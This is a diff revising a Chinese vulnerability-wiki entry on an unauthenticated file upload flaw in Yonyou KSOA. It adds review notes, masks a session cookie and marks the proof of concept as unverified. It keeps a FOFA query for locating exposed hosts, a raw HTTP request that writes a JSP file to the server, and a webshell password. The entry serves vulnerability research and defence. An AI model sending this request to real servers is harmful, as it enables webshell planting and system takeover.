@@ -1,21 +1,62 @@
 ---
-fofa: ".info/"
 source: "Threekiii/Vulnerability-Wiki"
+title: "用友时空KSOA ImageUpload上传"
+product: "用友时空KSOA"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "9.0声明"
+prerequisites: "称未登录但有session需说明"
+side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
+review_date: "2026-10-02"
+source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
+source_status: "recorded"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E7%94%A8%E5%8F%8B%E6%97%B6%E7%A9%BA-KSOA-V9.0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
+fofa_unverified: ".info/"
+category_recommendation: "ERP / 用友 KSOA"
+id: "vw-5301a1a20708e8791f97755d"
+entity_id: "ve-5301a1a20708e8791f97755d"
+schema_version: "1"
 ---
 
-# 用友时空 KSOA V9.0 文件上传漏洞
+# 用友时空KSOA ImageUpload上传
 
-## 漏洞描述
+## 条目说明
+
+- 对象与具体问题：用友时空KSOA；ImageUpload上传
+- 版本、配置及部署条件：9.0声明
+- 认证与权限前提：称未登录但有session需说明
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 同72，FOFA元数据误取Referer的.info/，正文查询完整
+- your-payload占位非可执行PoC且长度1不符；后附通用classloader另为载荷
+- 缺组件build/修复/响应文本，上传与执行条件分开
+
+## 操作风险
+
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
+### 漏洞描述
 
 用友时空 KSOA 是用友网络科技股份有限公司建立在 SOA 理念指导下研发的新一代产品，其中 com.sksoft.bill.ImageUpload 存在前台文件上传漏洞，攻击者可以在不登陆的情况下上传恶意 Webshell，控制系统权限。
 
-## 网络测绘
+### 网络测绘
 
 ```
 app="用友-时空KSOA"
 ```
 
-## 漏洞复现
+### 漏洞复现
 
 登录界面：
 
@@ -30,7 +71,7 @@ app="用友-时空KSOA"
 
 发送数据包：
 
-```
+```http
 POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=1.jsp HTTP/1.1
 Host: your-ip
 Pragma: no-cache
@@ -41,21 +82,22 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Referer: https://en.fofa.info/
 Accept-Encoding: gzip, deflate
 Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
-Cookie: JSESSIONID=825A011F31259CCA1649D5DF4849635E
+Cookie: JSESSIONID=8******************************E
 Connection: close
-Content-Length: 1
 
 <%!
 your-payload
 %>
 ```
 
+> 请求长度说明：原资料 Content-Length 为 1；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+
 ![image-20230601102530120](./.resource/用友时空-KSOA-V9.0-文件上传漏洞/media/image-20230601102530120.png)
 
 
 访问 /pictures/1.jsp 即可。
 
-### Webshell
+#### Webshell
 
 密码：passwd
 
